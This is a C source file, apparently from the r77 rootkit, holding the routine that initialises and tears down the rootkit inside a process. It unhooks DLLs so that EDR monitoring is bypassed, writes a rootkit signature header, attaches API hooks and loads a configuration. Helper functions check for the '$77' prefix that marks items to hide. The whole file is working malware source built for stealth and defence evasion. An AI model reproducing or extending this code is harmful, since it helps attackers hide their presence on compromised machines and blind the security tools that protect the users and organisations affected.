#include "Rootkit.h"
#include "Hooks.h"
#include "Config.h"
#include "r77def.h"
#include "r77header.h"
#include "Unhook.h"
#include <Shlwapi.h>

static BOOL RootkitInitialized;

BOOL InitializeRootkit()
{
	// Unhook DLL's that are monitored by EDR.
	Unhook();

	// If the process starts with $77, do not load r77.
	WCHAR executablePath[MAX_PATH + 1];
	if (FAILED(GetModuleFileNameW(NULL, executablePath, MAX_PATH))) return FALSE;
	if (HasPrefix(PathFindFileNameW(executablePath))) return FALSE;

	// Write the r77 header.
	if (!WriteR77Header(R77_SIGNATURE, DetachRootkit)) return FALSE;

	if (!RootkitInitialized)
	{
		RootkitInitialized = TRUE;

		// Initialize configuration system.
		InitializeConfig();

		// Attach hooks.
		InitializeHooks();
	}

	return TRUE;
}
VOID UninitializeRootkit()
{
	if (RootkitInitialized)
	{
		RootkitInitialized = FALSE;

		// Remove the r77 header.
		RemoveR77Header();

		// Uninitialize configuration system.
		UninitializeConfig();

		// Detach hooks.
		UninitializeHooks();
	}
}
static VOID DetachRootkit()
{
	// A thread was created with a pointer to DetachRootkit(), thus requesting the rootkit to remove itself gracefully.
	UninitializeRootkit();
}

BOOL HasPrefix(LPCWSTR str)
{
	return str && !StrCmpNIW(str, HIDE_PREFIX, HIDE_PREFIX_LENGTH);
}
BOOL HasPrefixU(UNICODE_STRING str)
{
	return str.Buffer && str.Length / sizeof(WCHAR) >= HIDE_PREFIX_LENGTH && !StrCmpNIW(str.Buffer, HIDE_PREFIX, HIDE_PREFIX_LENGTH);
}